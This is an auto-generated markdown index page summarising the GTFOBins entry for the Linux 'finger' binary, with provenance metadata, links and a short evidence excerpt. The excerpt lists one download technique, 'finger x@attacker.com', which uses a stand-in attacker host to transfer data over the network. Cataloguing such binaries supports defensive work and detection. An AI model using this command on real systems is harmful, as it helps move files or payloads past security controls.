---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# finger

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `finger` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/finger` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for finger covering download, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/finger.md)
- Source verification: [source record](../../sources/gtfobins/finger.md)

## Aliases

- `finger`

## Source Verification

[source record](../../sources/gtfobins/finger.md)

## Evidence Excerpt

```text
_body: ''
_name: finger
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/finger
functions:
download:
- code: finger x@attacker.com
comment: The command hangs waiting for the remote peer to close the socket.
contexts:
```
